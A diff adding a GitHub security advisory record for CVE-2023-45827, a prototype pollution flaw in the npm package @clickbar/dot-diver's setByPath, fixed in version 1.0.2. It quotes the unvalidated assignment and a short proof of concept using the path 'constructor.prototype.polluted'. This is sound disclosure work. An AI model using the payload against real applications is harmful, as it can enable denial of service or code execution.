@@ -1,0 +1,69 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-9w5f-mw3p-pj47",
+  "modified": "2023-11-06T19:34:19Z",
+  "published": "2023-11-03T19:03:40Z",
+  "aliases": [
+    "CVE-2023-45827"
+  ],
+  "summary": "Prototype Pollution(PP) vulnerability in setByPath",
+  "details": "### Summary\nThere is a Prototype Pollution(PP) vulnerability in dot-diver. It can leads to RCE.\n\n### Details\n```javascript\n//https://github.com/clickbar/dot-diver/tree/main/src/index.ts:277\n\n// eslint-disable-next-line @typescript-eslint/no-unsafe-member-access\n  objectToSet[lastKey] = value\n```\nIn this code, there is no validation for Prototpye Pollution.\n\n### PoC\n```javascript\nimport { getByPath, setByPath } from '@clickbar/dot-diver'\n\nconsole.log({}.polluted); // undefined\nsetByPath({},'constructor.prototype.polluted', 'foo');\nconsole.log({}.polluted); // foo\n```\n\n### Impact\nIt is Prototype Pollution(PP) and it can leads to Dos, RCE, etc.\n\n### Credits\nTeam : NodeBoB\n\n최지혁   ( Jihyeok Choi )\n\n이동하 ( Lee Dong Ha of ZeroPointer Lab )\n\n강성현    ( kang seonghyeun )\n\n박성진    ( sungjin park )\n\n김찬호    ( Chanho Kim )\n\n이수영    ( Lee Su Young )\n\n김민욱    ( MinUk Kim )\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "@clickbar/dot-diver"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.0.2"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/clickbar/dot-diver/security/advisories/GHSA-9w5f-mw3p-pj47"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45827"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/clickbar/dot-diver/commit/9790834cf4c2bca75db00e588e58056dacaf602f"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/clickbar/dot-diver/commit/98daf567390d816fd378ec998eefe2e97f293d5a"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/clickbar/dot-diver"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-1321"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-11-03T19:03:40Z",
+    "nvd_published_at": "2023-11-06T18:15:08Z"
+  }
+}
